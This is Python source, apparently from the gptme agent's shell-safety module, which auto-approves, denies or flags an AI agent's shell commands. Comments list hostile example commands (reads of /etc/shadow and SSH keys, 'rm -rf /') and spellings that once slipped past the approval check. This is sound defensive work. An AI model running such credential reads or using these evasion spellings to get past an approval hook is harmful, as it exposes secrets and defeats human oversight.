        index = 0
        pieces: list[str] = []
        while index < len(line):
            if line[index] == "\\" and not _is_in_quoted_region(index, regions):
                index += 2
                continue
            if line[index] in ";&|()" and not _is_in_quoted_region(index, regions):
                pieces.append(line[start:index])
                start = index + 1
            index += 1
        pieces.append(line[start:])
        for piece in pieces:
            try:
                piece, targets = _input_redirections(piece)
                lexer = shlex.shlex(piece, posix=True, punctuation_chars="><")
                lexer.whitespace_split = True
                lexer.commenters = ""
                tokens = list(lexer)
            except ValueError:
                tokens = piece.split()
                targets = []
            if tokens or targets:
                segments.append((tokens, targets))
    return segments


def _token_is_sensitive(token: str, cwd: Path | None) -> bool:
    """Whether one argument names a sensitive path, read from ``cwd``."""
    if token and all(char in ";&|><()" for char in token):
        return False
    # Bare root directory — e.g. `find /` or `ls /`
    if token == "/":
        return True
    # Path traversal that could escape to a sensitive directory.
    # Catches both absolute traversal (e.g. /home/user/../../../etc/passwd)
    # and relative traversal (e.g. ../../etc/passwd) — bash resolves the
    # latter relative to the current working directory, which we cannot
    # predict at validation time, so any `..` in a path is treated as
    # potentially sensitive and requires explicit confirmation.
    if ".." in token:
        return True
    # Shell pathname and brace expansion happen after validation. Literal
    # tokens such as /e??/shadow or /{etc/shadow,tmp/file} can therefore
    # become /etc/shadow at execution time. Require confirmation whenever
    # a path-like argument contains expansion metacharacters; ordinary
    # search patterns such as ``*.py`` remain eligible for auto-approval
    # because they contain no path separator.
    if "/" in token and any(char in token for char in "*?[{"):
        return True
    # Relative path arguments are interpreted from the persistent shell's
    # effective cwd. Check both the lexical path (what bash uses after a
    # ``cd`` through a symlink such as ``~/.config``) and the resolved one, so
    # a confirmed ``cd ~/.ssh`` cannot make a later ``cat id_rsa``
    # auto-approved, and neither can ``cd ~/.config/gptme && cat config.toml``.
    if cwd is not None and token and not token.startswith(("/", "~", "$")):
        bases = {Path(os.path.normpath(cwd.absolute())), cwd.resolve()}
        for base in bases:
            joined = str(base / token)
            if any(char in token for char in "*?[{"):
                # A slash-free glob expands inside ``base``: ``cat *`` from
                # ``~/.ssh``, or ``cat conf*`` from ``~/.config/gptme``.
                if _token_is_sensitive(base.as_posix(), None) or (
                    _contains_sensitive_location(base.as_posix(), None)
                ):
                    return True
            elif _token_is_sensitive(joined, None):
                return True
        return False
    # Sensitive directory prefixes (absolute paths). Collapse repeated
    # leading slashes before normalizing no-op dot segments: POSIX permits
    # normpath() to preserve exactly two leading slashes even though the
    # shell resolves //etc and /./etc to /etc on our supported platforms.
    abs_token = (
        os.path.normpath(re.sub(r"^/+", "/", token)) if token.startswith("/") else token
    )
    home = os.path.expanduser("~")

    # Sensitive home-relative credential directories.
    # Normalize $HOME/... and ${HOME}/... to ~/... before matching so that
    # shell-variable spellings (cat "$HOME/.ssh/id_rsa") are caught too.
    # Use a boundary check (exact match or followed by "/") to avoid
    # false-positives on sibling paths like ~/.sshrc or ~/.npmrc-public.
    normalized = abs_token
    if token.casefold() == home.casefold() or token.casefold().startswith(
        home.casefold() + "/"
    ):
        normalized = "~" + token[len(home) :]
    else:
        for sub in ("${HOME}/", "$HOME/"):
            if token.startswith(sub):
                normalized = "~/" + token[len(sub) :]
                break
    # ~username/... spellings (e.g. ~root/.ssh/id_rsa) name another user's
    # home dir; strip the username component and treat the rest as ~/...
    # so the sensitive-dir boundary check below fires for those too.
    if re.match(r"^~[^/]+/", normalized) and not normalized.startswith("~/"):
        normalized = "~/" + re.sub(r"^~[^/]+/", "", normalized)
    # Relative path arguments are interpreted from the persistent shell's
    # effective cwd. Resolve lexical components here so a confirmed
    # ``cd ~/.ssh`` cannot make a later ``cat id_rsa`` auto-approved.
    if cwd is not None and not normalized.startswith(("/", "~")):
        normalized = str(cwd.resolve() / normalized)
        if normalized == home or normalized.startswith(home + "/"):
            normalized = "~" + normalized[len(home) :]

    # Collapse redundant separators so that $HOME//.ssh/id_rsa (→ ~//.ssh/id_rsa)
    # still matches the ~/ prefix boundary after double-slash removal.
    while "//" in normalized:
        normalized = normalized.replace("//", "/")
    # Remove no-op ./ segments (e.g. ~/./.ssh/id_rsa → ~/.ssh/id_rsa) that
    # bash resolves at runtime but which bypass literal prefix matching.
    while "/./" in normalized:
        normalized = normalized.replace("/./", "/")
    # Resolve parent-directory (..) segments within the home-relative path
    # (e.g. ~/tmp/../.ssh/id_rsa → ~/.ssh/id_rsa).  Tokens with ".." are
    # already caught by the path-traversal check above; this normpath pass
    # ensures the prefix check below is also correct as belt-and-suspenders.
    if ".." in normalized:
        normalized = os.path.normpath(normalized)
    # Normalize home variables before resolving paths, then check both system
    # and credential locations. Resolve the protected locations too: ~/.ssh
    # may link outside home, and macOS /etc links to /private/etc. Retain the
    # literal spellings for case variants and paths that do not exist yet.
    locations = {
        spelling.rstrip("/").casefold()
        for location in (*_SENSITIVE_PATH_PREFIXES, *_SENSITIVE_HOME_DIRS)
        for spelling in (location, _resolve_symlinks(location, home))
    }
    # Keep the lexical absolute spelling too, including expansion of ~/$HOME:
    # a home symlink can otherwise erase a protected ancestor such as /root.
    # Resolve the original spelling independently: case-folded home matching
    # must not redirect resolution to a different path on case-sensitive hosts.
    absolute = home + normalized[1:] if normalized.startswith("~") else normalized
    for candidate in (
        abs_token,
        normalized,
        absolute,
        _resolve_symlinks(abs_token, home),
        _resolve_symlinks(normalized, home),
    ):
        folded = candidate.casefold()
        if any(
            folded == location or folded.startswith(location + "/")
            for location in locations
        ):
            return True
    return False


def _has_sensitive_args(cmd: str, cwd: Path | None = None) -> bool:
    """Check whether any argument in the command targets a sensitive system path.

    Heredoc delimiters and bodies are shell syntax and stdin data rather than
    filesystem arguments, so blank them before tokenizing.

    P1 fix: `is_allowlisted()` previously checked command NAMES only, so
    ``cat /etc/shadow`` was auto-approved because ``cat`` is allowlisted.
    This helper rejects the command when any argument matches a sensitive
    path prefix, is the bare root directory ``/``, or contains shell glob
    metacharacters that could expand to a sensitive path after validation.

    Also covers P4: ``find /`` traverses the entire filesystem; the ``/``
    argument is caught here.

    Three spellings used to hide the path from the literal-token check:

    - a value attached to an option (``grep --file=/etc/shadow``,
      ``grep -f/etc/shadow``) is scanned as an argument of its own;
    - a ``cd`` earlier in the same command moves the directory that later
      relative arguments are read from (``cd ~ && cat .ssh/id_rsa``), so
      relative arguments are resolved from every directory the command can
      be in, and a ``cd`` whose destination is unknown requires confirmation;
    - a recursive reader (``grep -r``, ``rg``, ``find``, ``ls -R``, ``du``)
      pointed at a directory that *contains* a credential location
      (``grep -r AWS_SECRET ~``) requires confirmation. With no directory
      operand it reads the current directory, which is checked the same way.

    Returns True if a sensitive argument is found (approval should be denied).
    """
    # Blank heredoc bodies (stdin data) *and* headers (the << / <<- opener and
    # its delimiter word). Both are shell syntax, not filesystem arguments.
    # Critically, header blanking is spacing-aware: ``<<-`` (attached) treats
    # the following word as the delimiter and blanks it, while ``<< -`` (spaced)
    # is a delimiter literally named ``-`` whose next token is a real argument.
    # The old token loop could not distinguish these (shlex collapses the
    # whitespace), so ``cat << - /etc/shadow`` auto-approved a genuine read;
    # regex-based blanking keeps the real path visible, so it is scanned.
    cmd_blanked = _blank_heredoc_headers(_blank_heredoc_bodies(cmd))
    segments = _command_segments(cmd_blanked)

    # Every directory the shell can be in when a given segment runs. A ``cd``
    # adds its destination rather than replacing the start directory: a
    # subshell, pipeline or failed ``cd`` leaves the old directory in effect,
    # so checking all of them never under-approximates.
    cwds: list[Path | None] = [cwd]
    for index, (segment, targets) in enumerate(segments):
        if any(
            _token_is_sensitive(target, base) for target in targets for base in cwds
        ):
            return True
        if not segment:
            continue
        name, args = segment[0], segment[1:]
        candidates: list[str] = []
        for arg_index, token in enumerate(args):
            # find's name patterns are matched by find, not read as files.
            # A quoted '*.py' must not become a cwd-wide credential glob.
            if (
                name == "find"
                and arg_index > 0
                and args[arg_index - 1]
                in (
                    "-name",
                    "-iname",
                    "-path",
                    "-ipath",
                    "-regex",
                    "-iregex",
                    "-lname",
                    "-ilname",
                )
            ):
                continue
            candidates.append(token)
            if (value := _attached_option_value(name, token)) is not None:
                candidates.append(value)
        for token in candidates:
            if any(_token_is_sensitive(token, base) for base in cwds):
                return True

        if name == "cd":
            destinations = _cd_destinations(args, cwds)
            if destinations is None:
                # Unknown destination: anything after it may read from it.
                if index + 1 < len(segments):
                    return True
            else:
                cwds.extend(d for d in destinations if d not in cwds)
        elif _is_recursive_reader(name, args):
            roots = _recursive_roots(name, args)
            for root in roots:
                if any(_contains_sensitive_location(root, base) for base in cwds):
                    return True

    return False


def _resolve_symlinks(normalized: str, home: str) -> str:
    """Return the absolute symlink target of a normalized path.

    ``os.path.realpath`` resolves the components that exist, so a symlinked
    directory is followed even when the leaf does not exist yet. Keep the
    absolute spelling: mapping back to ~ would hide system ancestors when
    home is nested inside a protected directory (e.g. /root/app).
    """
    if normalized == "~":
        absolute = home
    elif normalized.startswith("~/"):
        absolute = os.path.join(home, normalized[2:])
    elif normalized.startswith("/"):
        absolute = normalized
    else:
        return normalized
    return os.path.realpath(absolute)


def _has_command_substitution(cmd: str) -> bool:
    """Check whether the command contains shell command substitution.

    P2 fix: backtick and ``$(...)`` command substitution are not reliably
    parsed as command separators by ``cmd_regex``. Commands such as
    ``ls `cat /etc/shadow``` and ``cat "$(echo /etc/passwd)"`` were therefore
    previously auto-approved.

    Bash semantics for backticks:
    - Outside quotes or inside double quotes → command substitution (unsafe)
    - Inside single quotes → literal character (safe)

    P2b fix: single quotes inside a double-quoted string are **literal
    characters** in bash — they do NOT create a nested single-quote context.
    The original implementation only tracked single-quote state, so a command
    like ``echo "it's `cmd`"`` incorrectly set ``in_single=True`` when it saw
    the apostrophe, then missed the backtick because it appeared to be inside
    single quotes.  The fix adds ``in_double`` tracking and gates single-quote
    transitions on ``not in_double``.

    Returns True if executable backtick, ``$(...)`` or ``<(...)``/``>(...)``
    process-substitution syntax is found.
    """
    # Reuse the shared, ANSI-C-aware quote classifier so this scanner cannot
    # disagree with ``_find_quotes`` about where a string starts or ends.
    ctx = _shell_context(cmd)
    # A heredoc body is not shell syntax: ``#`` does not start a comment and
    # quotes are literal, but an *unquoted* heredoc still expands ``$(...)``
    # and backticks. Treat body positions as unquoted so a substitution there
    # is never mistaken for comment or string data. (Conservative for quoted
    # delimiters: it forces a confirmation prompt instead of auto-approving.)
    heredoc_body = bytearray(len(cmd))
    for start, end in _find_heredoc_regions(cmd):
        heredoc_body[start:end] = b"\x01" * (end - start)
    i = 0
    n = len(cmd)
    while i < n:
        kind = _UNQUOTED if heredoc_body[i] else ctx[i]
        # Plain single quotes and comments are literal; nothing substitutes.
        if kind == _SINGLE or kind == _COMMENT:
            i += 1
            continue
        c = cmd[i]
        # Escape sequences: active outside plain single quotes (so also inside
        # ANSI-C strings and double quotes). The escaped character is literal.
        if c == "\\" and i + 1 < n:
            i += 2
            continue
        # Inside an ANSI-C string nothing substitutes.
        if kind == _ANSI_C:
            i += 1
            continue
        # Backticks and $(...) substitute outside single quotes, including
        # inside double-quoted strings.
        if c == "`" or cmd.startswith("$(", i):
            return True
        # Process substitution <(...) / >(...) runs a command too, but unlike
        # $(...) it is inert inside double quotes, so only unquoted positions
        # count. Without this, `rg pattern <(sh -c id)` auto-approved: the
        # inner command never appears at a separator cmd_regex looks for.
        if kind == _UNQUOTED and (cmd.startswith("<(", i) or cmd.startswith(">(", i)):
            return True
        i += 1
    return False


# Heredoc opener plus optional attached ``-`` (indent) flag plus the delimiter
# word. ``<<<`` (here-string) is excluded via ``(?<!<)...(?!<)`` because an
# unquoted here-string takes a real filename operand that must stay visible:
# for a run ``<<<``, neither ``<<`` start position passes both lookarounds,
# so nothing is blanked and the operand reaches the sensitive-path scan.
_HEREDOC_HEADER = re.compile(
    r"(?<!<)<<(?!<)-?\s*(?:\"[^\"\n]+\"|'[^'\n]+'|[^\s;&|<>]+)"
)


def _blank_heredoc_bodies(cmd: str) -> str:
    """Replace heredoc bodies with blanks, preserving offsets.

    Heredoc content is *data* fed to a command's stdin, not command
    arguments. Leaving it in place would make a body line such as
    ``-exec`` look like a flag to the permitted-flag checker.
    """
    regions = _find_heredoc_regions(cmd)
    if not regions:
        return cmd

    chars = list(cmd)
    for start, end in regions:
        for i in range(start, min(end, len(chars))):
            if chars[i] != "\n":
                chars[i] = " "
    return "".join(chars)


def _blank_heredoc_headers(cmd: str) -> str:
    """Blank heredoc opener + delimiter words, preserving everything else.

    Heredoc openers (``<<`` / ``<<-`` and the delimiter word) are shell
    syntax, not filesystem arguments. Blanking them keeps a path-like
    delimiter (``cat <<- /etc/shadow``) out of the sensitive-path scan.

    Critically, only the *attached* ``<<-`` form treats the following word as
    a delimiter. In the spaced ``<< -`` form bash treats ``-`` *itself* as the
    delimiter and the next token as a real argument, so ``cat << - /etc/shadow``
    genuinely reads ``/etc/shadow`` and must remain visible to the scan. The
    regex handles this because the optional ``-`` is attached to ``<<`` with no
    intervening whitespace; a spaced ``-`` is matched only as the delimiter word
    and any further token after it is untouched.
    """
    chars = list(cmd)
    quoted_regions = _find_quotes(cmd)
    for match in _HEREDOC_HEADER.finditer(cmd):
        # Keep the same lexical guards as ``_find_heredoc_regions``. Quoted or
        # escaped apparent openers are data, not heredoc syntax. In particular,
        # ``cat \<< /etc/shadow`` leaves one real ``<`` redirection whose path
        # must remain visible to the sensitive-argument scan.
        if _is_in_quoted_region(match.start(), quoted_regions):
            continue
        backslashes = 0
        pos = match.start() - 1
        while pos >= 0 and cmd[pos] == "\\":
            backslashes += 1
            pos -= 1
        if backslashes % 2:
            continue

        for i in range(match.start(), match.end()):
            if chars[i] != "\n":
                chars[i] = " "
    return "".join(chars)


def _blank_shell_comments(cmd: str) -> str:
    """Replace unquoted shell comments with blanks, preserving newlines."""
    # Shared classifier: ANSI-C strings are single-quoted contexts, so a ``#``
    # inside ``$'...'`` is not a comment (a private scanner used to blank it).
    ctx = _shell_context(cmd)
    chars = list(cmd)
    for i, kind in enumerate(ctx):
        if kind == _COMMENT and chars[i] != "\n":
            chars[i] = " "
    return "".join(chars)


def is_allowlisted(cmd: str, cwd: Path | None = None) -> bool:
    """Check if a shell command is safe to auto-approve.

    Uses a conservative allowlist approach:
    1. All commands in the pipeline must be in the allowlist, after stripping
       transparent wrappers (``time``, ``timeout N``, ``nohup``, ``env -i``,
       ``nice -n N``, ``stdbuf``, ``command``, ``builtin``)
    2. No file redirections (>, >>) - these can write malicious content
    3. No sensitive path arguments (e.g. /etc/shadow, /root/, /proc/)
    4. No executable shell command substitution
    5. Every flag must be in its binary's *permitted* flag set

    This means commands like xargs, sh, bash, python, perl, etc. are automatically
    blocked since they're not in the allowlist, even if piped to from safe commands.

    Step 5 is a permitted-flag model, not a forbidden-flag model: an
    unrecognised flag makes this function return False, which does not forbid
    the command — it falls through to the normal confirmation prompt. See
    ``gptme/tools/shell_flags.py`` for the tables and the rationale.
    """
    # Heredoc bodies are data, not command segments or arguments. Keep the
    # original command for substitution/redirection checks below: an unquoted
    # heredoc body can itself perform command substitution.
    cmd_without_heredoc_data = _blank_heredoc_bodies(cmd)
    cmd_without_inert_data = strip_transparent_wrappers(
        _blank_shell_comments(cmd_without_heredoc_data)
    )

    # Check if all commands in the pipeline are allowlisted
    # This blocks non-allowlisted commands like: python, perl, xargs, sh, bash, etc.
    for match in cmd_regex.finditer(cmd_without_inert_data):
        for group in match.groups():
            if group and group not in allowlist_commands:
                return False

    # Check for file redirections (>, >>)
    # File redirections with allowlisted commands can be used to write malicious content
    # Example: echo "malicious_code" > /tmp/exploit.sh
    if _has_file_redirection(cmd):
        return False

    # P1/P4: Check for sensitive path arguments (e.g. /etc/shadow, /root/, /)
    # Allowlisted commands like `cat` must not auto-approve reads of sensitive paths.
    if _has_sensitive_args(cmd, cwd=cwd):
        return False

    # P2: Check for executable shell command substitution. Both backticks and
    # $(...) imply a nested execution context that should require confirmation.
    if _has_command_substitution(cmd):
        return False

    # GHSA-mfh4-cxj2-jc9p: every flag must be permitted for its binary.
    #
    # This replaces a four-entry denylist ({-exec, -execdir, -delete, -ok})
    # that modelled `find` only. Other allowlisted binaries have their own
    # subprocess-spawning and file-writing flags (`rg --pre`,
    # `sort --compress-program`, `sort -o`, `find -fprintf`, `tree -o`, ...),
    # none of which the denylist covered. A permitted-flag model fails closed
    # on flag number five instead of waiting for someone to report it.
    #
    # Heredoc bodies and shell comments are data, not arguments, so use the
    # blanked command — otherwise inert text starting with `-` would look like
    # a flag and force an unnecessary confirmation prompt.
    return flags_permitted(cmd_without_inert_data)


# Appended to every shell-command denial. A denied pattern rejects the whole
# invocation before anything runs, but in an ``a && b && c`` chain the model
# would otherwise assume (normal shell semantics) that earlier steps ran.
NOT_EXECUTED_NOTE = "Nothing was executed: the whole command was rejected."


def format_denial(message: str) -> str:
    """Format a shell-command denial so it states that nothing ran."""
    return f"{message}\n\n{NOT_EXECUTED_NOTE}"


def format_denylist_denial(
    matched_cmd: str | None, reason: str | None, label: str = "Command denied"
) -> str:
    """Format the message for a command rejected by :func:`is_denylisted`."""
    return format_denial(f"{label}: `{matched_cmd}`\n\n{reason}")


# A pipe into a script interpreter: whether it runs the piped text depends on
# its arguments, which _interpreter_gets_program() parses.
_INTERPRETER_PIPE_RE = re.compile(
    r"\|\s*(?P<interp>(?:[^\s|;&()]*/)?(?:python[\d.]*|perl|ruby|node))"
    r"(?=[\s)};|&]|$)"
)
_PIPE_REASON = (
    "Piping to shell interpreters or script execution is blocked. This pattern "
    "can execute arbitrary code and is a security risk."
)


@dataclass(frozen=True)
class _InterpreterArgs:
    """How an interpreter's command-line options are parsed. Anything not
    listed counts as unknown, and unknown means the pipe may be the program."""

    inline: str  # short flags whose program is in the arguments (-c, -e)
    value: str  # short flags taking a value, attached or the next argument
    rest: str  # short flags taking an optional value: the rest of the cluster
    digits: str  # short flags taking optional digits (perl -l, -0777)
    flags: str  # short flags taking no value
    inline_long: frozenset[str] = frozenset()
    value_long: frozenset[str] = frozenset()
    flags_long: frozenset[str] = frozenset({"--help", "--version"})


_INTERPRETER_ARGS = {
    "python": _InterpreterArgs(
        inline="cm",
        value="WXQ",
        rest="",
        digits="",
        flags="bBdEhiIOPqRsSuvVx?",
        value_long=frozenset({"--check-hash-based-pycs"}),
    ),
    "perl": _InterpreterArgs(
        inline="eE",
        value="IMm",
        rest="iFxDdC",
        digits="0l",
        flags="acnpsStTuUvwWXh",
    ),
    "ruby": _InterpreterArgs(
        inline="e",
        value="IrEC",
        rest="FxK",
        digits="0W",
        flags="acdhlnpsSvwy",
        value_long=frozenset({"--enable", "--disable", "--encoding", "--dump"}),
        flags_long=frozenset({"--help", "--version", "--verbose", "--copyright"}),
    ),
    "node": _InterpreterArgs(
        inline="ep",
        value="rC",
        rest="",
        digits="",
        flags="hivc",
        inline_long=frozenset({"--eval", "--print"}),
        value_long=frozenset(
            {"--require", "--import", "--input-type", "--loader", "--conditions"}
        ),
        flags_long=frozenset(
            {
                "--help",
                "--version",
                "--no-warnings",
                "--enable-source-maps",
                "--trace-warnings",
                "--no-deprecation",
                "--trace-deprecation",
                "--expose-gc",
                "--preserve-symlinks",
                "--check",
            }
        ),
    ),
}
_COMMAND_SEPARATORS = {"|", "||", "&", "&&", ";", ";;", "(", ")"}


def _interpreter_args(rest: str) -> list[str] | None:
    """The interpreter's arguments as the shell passes them, without
    redirects; None if they can't be parsed."""
    line = rest.split("\n", 1)[0]
    try:
        stream = io.StringIO(line)
        lexer = shlex.shlex(stream, posix=True, punctuation_chars=True)
        lexer.whitespace_split = True
        # (token, whether it ended directly before a redirect operator). shlex
        # drops whitespace, so `python3 123 > out` and `2>out` would otherwise
        # look alike; only the latter's digits are the redirect's fd.
        lexed: list[tuple[str, bool]] = []
        start = 0
        for token in lexer:
            end = stream.tell()
            before_redirect = line[end - 1 : end] in ("<", ">")
            # A shell IO_NUMBER must be unquoted and unescaped. shlex strips
            # both, so inspect the source spelling as well as adjacency.
            raw = line[start : end - 1] if before_redirect else ""
            lexed.append((token, before_redirect and raw.lstrip() == token))
            start = end - 1 if before_redirect else end
    except ValueError:
        return None
    tokens = iter(lexed)
    args: list[str] = []
    fd_adjacent = False
    for token, before_redirect in tokens:
        if token in _COMMAND_SEPARATORS:
            break
        if set(token) <= set("<>&") and set(token) & set("<>"):
            # a redirect (`2>/dev/null`, `>&1`): drop its fd and target
            if args and args[-1].isdigit() and fd_adjacent:
                args.pop()
            next(tokens, None)
            fd_adjacent = False
            continue
        args.append(token)
        fd_adjacent = before_redirect
    return args


def _is_plain_path(arg: str) -> bool:
    """Not stdin and not something the shell expands (an empty variable or a
    glob matching nothing would leave the interpreter reading stdin)."""
    return arg != "-" and not set(arg) & set("$`*?[{")


def _interpreter_gets_program(interp: str, rest: str) -> bool:
    """Whether a piped-into interpreter certainly gets its program from its
    arguments (``-c``/``-e`` or a script file) rather than from the pipe.

    Default deny: an option this doesn't know, a shell expansion where the
    script would be, or no program at all means the pipe may be the program.
    """
    family = re.sub(r"[\d.]+$", "", interp.rsplit("/", 1)[-1])
    spec = _INTERPRETER_ARGS[family]
    args = _interpreter_args(rest)
    if args is None:
        return False
    i = 0
    while i < len(args):
        arg = args[i]
        i += 1
        if arg == "--":
            return i < len(args) and _is_plain_path(args[i])
        if arg.startswith("--"):
            name, eq, _ = arg.partition("=")
            if name in spec.inline_long:
                return True
            if name in spec.value_long:
                i += 0 if eq else 1
            elif name not in spec.flags_long:
                return False
            continue
        if arg.startswith("-") and arg != "-":
            cluster = arg[1:]
            j = 0
            while j < len(cluster):
                flag = cluster[j]
                j += 1
                if flag in spec.inline:
                    return True
                if flag in spec.value:
                    i += 0 if j < len(cluster) else 1
                    break
                if flag in spec.rest:
                    break
                if flag in spec.digits:
                    while j < len(cluster) and cluster[j].isdigit():
                        j += 1
                elif flag not in spec.flags:
                    return False
            continue
        return _is_plain_path(arg)  # the script file
    return False


def is_denylisted(cmd: str) -> tuple[bool, str | None, str | None]:
    """Check if a command contains dangerous patterns that should be denied.

    Only checks actual commands, not content in quoted strings or heredocs.

    Returns:
        tuple[bool, str | None, str | None]: (is_denied, reason_if_denied, matched_command)
    """
    # Find both quoted regions and heredoc regions in the original command
    # (heredocs require newlines to be detected properly)
    quoted_regions = _find_quotes(cmd)
    heredoc_regions = _find_heredoc_regions(cmd)

    # Combine all safe regions
    safe_regions = quoted_regions + heredoc_regions

    # Check deny groups against the original command
    # We don't normalize because it would break heredoc detection
    for patterns, reason in deny_groups:
        for pattern in patterns:
            for match in re.finditer(pattern, cmd, re.IGNORECASE):
                # Skip quoted/heredoc text. Keep scanning so a later
                # unquoted occurrence (echo '...'; rm -rf /) still matches.
                if _is_in_quoted_region(match.start(), safe_regions):
                    continue
                # `)` is a grouping delimiter only when unquoted. Quoted
                # data such as echo '(rm -rf /)' is skipped via match.start()
                # above; this also rejects mixed cases where the command is
                # unquoted but the `)` that completed the match is data.
                if match.group(0).endswith(")") and _is_in_quoted_region(
                    match.end() - 1, safe_regions
                ):
                    continue
                return True, reason, match.group(0)

    for match in _INTERPRETER_PIPE_RE.finditer(cmd):
        if _is_in_quoted_region(match.start(), safe_regions):
            continue
        if not _interpreter_gets_program(match.group("interp"), cmd[match.end() :]):
            return True, _PIPE_REASON, match.group(0)

    return False, None, None


def shell_allowlist_hook(
    tool_use: "ToolUse",
    preview: str | None = None,
    workspace: "Path | None" = None,
):
    """Auto-approve hook for allowlisted shell commands.

    This hook is registered with high priority (10) to check allowlisted
    commands before falling through to CLI/server confirmation hooks.

    Returns:
        ConfirmationResult.confirm() for allowlisted commands,
        None to fall through to the next hook for non-allowlisted commands.
    """
    from ..hooks.confirm import ConfirmationResult

    # Only handle shell tool
    if tool_use.tool != "shell":
        return None

    # Get the command to check.  For bg sequences the preview contains the full
    # command context (preceding + bg + remaining) while tool_use.content is
    # only the bg_cmd fragment.  Always prefer preview when present so that a
    # dangerous preceding command (e.g. "cat ~/.ssh/id_rsa\nbg ls") is not
    # silently approved because the isolated bg fragment ("ls") is allowlisted.
    cmd = (preview or tool_use.content or "").strip()
    if not cmd:
        return None

    # ``bg`` is gptme control syntax, not a shell binary, so remove its prefix
    # before checking the complete sequence.  A bg command may follow a shell
    # separator on the same line as well as start a line. Keep every separator
    # and surrounding command in place so is_allowlisted() still validates the
    # complete sequence. Only remove prefixes outside quoted regions; text such
    # as ``echo "hi; bg ls"`` is ordinary shell content, not gptme syntax.
    quote_regions = _find_quotes(cmd)

    def _strip_bg_prefix(match: re.Match[str]) -> str:
        return (
            match.group(0)
            if _is_in_quoted_region(match.start(), quote_regions)
            else match.group(1) + match.group(2)
        )

    check_cmd = re.sub(
        r"(^|(?<=[;&|]))(\s*)bg\s+",
        _strip_bg_prefix,
        cmd,
        flags=re.MULTILINE,
    )

    # Check if command is allowlisted
    if is_allowlisted(check_cmd, cwd=workspace):
        logger.debug(f"Shell command allowlisted, auto-confirming: {cmd[:50]}...")
        return ConfirmationResult.confirm()

    # Not allowlisted - fall through to next hook (CLI/server)
    return None


def check_with_shellcheck(cmd: str) -> tuple[bool, bool, str]:
    """
    Run shellcheck on command if available.

    Returns: Tuple of (has_issues: bool, should_block: bool, message: str)
    - has_issues: True if there are findings to show
    - should_block: True if the command is broken and must not run
    - message: Description of the findings

    Blocks on ``error``-severity findings, which mean the command is broken
    or wrong rather than unidiomatic: parse errors (an unclosed quote, a
    heredoc without its terminator) and bugs like unquoted ``$@`` or a
    string compared with ``-eq``. Also blocks on the codes in
    GPTME_SHELLCHECK_ERROR_CODES (default: SC1011, SC2006). Other findings (style, quoting advice) are hidden: in
    one-off agent commands they were nearly always ignored and only cost
    context. Show them with GPTME_SHELLCHECK_WARNINGS=1.

    SC2284 is never blocking: shellcheck 0.9.x reports it with error
    severity and fires it on literal ``==``/``===`` arguments (e.g.
    ``echo ===``), which would reject a valid command outright.

    Note:
        - Requires shellcheck (sudo apt install shellcheck)
        - Can be disabled with GPTME_SHELLCHECK=off
        - Non-blocking if shellcheck unavailable
        - Custom excludes via GPTME_SHELLCHECK_EXCLUDE (comma-separated codes)
    """
    # Check if disabled via environment variable
    if os.environ.get("GPTME_SHELLCHECK", "").lower() in ("off", "false", "0"):
        return False, False, ""

    # Check if shellcheck is available
    if not shutil.which("shellcheck"):
        return False, False, ""

    # Default excluded codes (only matter with GPTME_SHELLCHECK_WARNINGS)
    # SC2002: Useless cat. Consider 'cmd < file | ..' or 'cmd file | ..' instead
    # SC2016: Expressions don't expand in single quotes, use double quotes for that.
    # SC2164: Use 'cd ... || exit' in case cd fails (too noisy for interactive commands)
    default_excludes = ["SC2002", "SC2016", "SC2164"]

    # Get custom excludes from environment variable
    custom_excludes = os.environ.get("GPTME_SHELLCHECK_EXCLUDE", "").split(",")
    custom_excludes = [code.strip() for code in custom_excludes if code.strip()]

    # Codes that are reported but never block execution.
    # SC2284 ("Use [ x = y ] to compare values") is a style hint, but
    # shellcheck 0.9.x (e.g. Ubuntu 24.04) reports it with error severity
    # and fires it on literal `==`/`===` arguments, e.g. `echo ===` used as
    # a section separator. Blocking that rejects a valid command outright.
    non_blocking_codes = {"SC2284"}

    # Combine default and custom excludes
    all_excludes = default_excludes + custom_excludes
    exclude_str = ",".join(all_excludes)

    # Codes that block besides error-severity findings
    # SC1011: This apostrophe terminated the single quoted string!
    # SC2006: Use $(...) notation instead of legacy backticks (causes formatting issues in commits/PRs)
    default_error_codes = ["SC1011", "SC2006"]

    # Get custom error codes from environment variable
    custom_error_codes_str = os.environ.get("GPTME_SHELLCHECK_ERROR_CODES", "")
    if custom_error_codes_str:
        custom_error_codes = [
            code.strip() for code in custom_error_codes_str.split(",") if code.strip()
        ]
        error_codes = set(default_error_codes + custom_error_codes)
    else:
        error_codes = set(default_error_codes)
    show_warnings = os.environ.get("GPTME_SHELLCHECK_WARNINGS", "").lower() in (
        "1",
        "true",
        "on",
    )

    # Write command to temp file

    with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
        f.write("#!/bin/bash\n")
        f.write(cmd)
        temp_path = f.name

    try:
        shellcheck_cmd = ["shellcheck", "-f", "gcc"]
        if exclude_str:
            shellcheck_cmd.extend(["--exclude", exclude_str])
        shellcheck_cmd.append(temp_path)

        result = subprocess.run(
            shellcheck_cmd,
            check=False,
            capture_output=True,
            text=True,
            timeout=5,
        )

        if result.returncode != 0 and result.stdout:
            output = result.stdout.replace(temp_path, "<command>")
            # gcc format: <file>:<line>:<col>: <severity>: <message> [SCxxxx]
            findings = [
                (match.group(1), match.group(2), line)
                for line in output.splitlines()
                if (match := re.search(r": (\w+): .*\[(SC\d+)\]$", line))
            ]
            blocking = [
                (code, line)
                for severity, code, line in findings
                if code not in non_blocking_codes
                and (code in error_codes or severity == "error")
            ]

            if blocking:
                codes_str = ", ".join(sorted({code for code, _ in blocking}))
                lines = "\n".join(line for _, line in blocking)
                message = f"Shellcheck found critical issues that prevent execution:\n{md_codeblock('', lines)}\n\nBlocking codes: {codes_str}"
                if any(code == "SC1044" for code, _ in blocking):
                    message += (
                        "\n\nA here document is missing its end marker (it "
                        "must be alone on its line, unindented unless <<- is "
                        "used). Bash would have run it with whatever came "
                        "after as its content. To write a file, the save tool "
                        "avoids quoting and heredoc pitfalls."
                    )
                return True, True, message
            if show_warnings:
                message = (
                    f"Shellcheck found potential issues:\n{md_codeblock('', output)}"
                )
                return True, False, message

        return False, False, ""
    except (OSError, subprocess.SubprocessError):
        return False, False, ""
    finally:
        try:
            os.unlink(temp_path)
        except OSError:
            pass
